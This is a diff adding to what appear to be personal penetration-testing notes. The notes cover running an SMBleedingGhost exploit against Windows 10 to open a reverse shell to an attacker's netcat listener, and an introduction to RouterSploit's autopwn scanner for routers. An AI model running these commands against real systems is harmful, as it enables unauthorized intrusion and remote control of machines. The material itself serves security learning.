@@ -328,3 +328,14 @@ in order to do it we need netcat and we create it as follows:
 then the exploit(SMBleedingGhost.py) has to be executed from a windows OS and then redirect the connection to the attacker's kali linux machine to pop a shell as follows:
 > python3 SMBleedingGhost.py <target_ip> <listening_attacker_ip> <listener's_port_no.> (also the listening_attacker's PC could also be the windows machine but make sure netcat is installed to create a listening port)
 (this exploit might crash target's win10 pc but trying eventually will work out)
+
+Intro to RouterSploit:
+Download using the following link: https://github.com/threat9/routersploit.git
+A program that allows users to check whether home routers are vulnerable to any exploit and also consists of same interface such as msfc
+the modules present in routersploit are: exploits, scanners, creds, generic, payloads, encoders
+For eg: (to run all exploits with the target router to check if it's vulnerable to any)
+> use scanners/autopwn
+> show options (used to set options such as target router's ip_addr)
+after entering it scans whether it is vulnerable to any exploits
+TO DOWNLOAD: https://github.com/threat9/routersploit (to install check out the README.md in the git repo)
+FOR MORE: https://www.threat9.com/blog
